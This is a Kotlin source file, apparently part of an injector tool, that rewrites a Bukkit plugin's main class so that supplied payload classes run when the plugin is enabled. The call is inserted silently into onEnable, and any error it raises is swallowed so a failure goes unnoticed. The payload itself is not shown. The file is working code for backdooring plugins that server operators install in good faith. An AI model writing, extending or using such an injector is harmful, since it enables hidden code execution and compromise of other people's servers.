package com.tmquan2508.inject.injector.modules

import com.rikonardo.cafebabe.ClassFile
import com.tmquan2508.inject.cli.Logs
import javassist.ClassPool
import javassist.CtClass
import javassist.CtNewMethod
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import java.io.ByteArrayInputStream

internal fun patchMainClass(
    originalMainClassBytes: ByteArray,
    finalPayloadClasses: List<ClassFile>,
    finalMainPayloadCallName: String
): ByteArray {
    val codeToInsert = "try { new $finalMainPayloadCallName((org.bukkit.plugin.Plugin)this); } catch (Throwable ignored) { }"
    Logs.info(" -> Code to insert: { $codeToInsert }")

    val pool = ClassPool(true)
    var cc: CtClass? = null
    try {
        finalPayloadClasses.forEach { classFile ->
            pool.makeClass(ByteArrayInputStream(classFile.compile()))
        }
        cc = pool.makeClass(ByteArrayInputStream(originalMainClassBytes))
        cc.defrost()
        try {
            val onEnableMethod = cc.getDeclaredMethod("onEnable")
            onEnableMethod.insertBefore(codeToInsert)
        } catch (e: javassist.NotFoundException) {
            Logs.warn(" -> Method 'onEnable' not found. Creating a new one.")
            val newMethod = CtNewMethod.make("public void onEnable() { $codeToInsert }", cc)
            cc.addMethod(newMethod)
        }

        val javassistBytes = cc.toBytecode()
        Logs.info(" -> Generated bytecode with Javassist.")

        val classReader = ClassReader(javassistBytes)
        val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
        classReader.accept(classWriter, 0)
        Logs.info(" -> Cleaned bytecode with ASM ClassWriter.")

        return classWriter.toByteArray()

    } finally {
        cc?.detach()
    }
}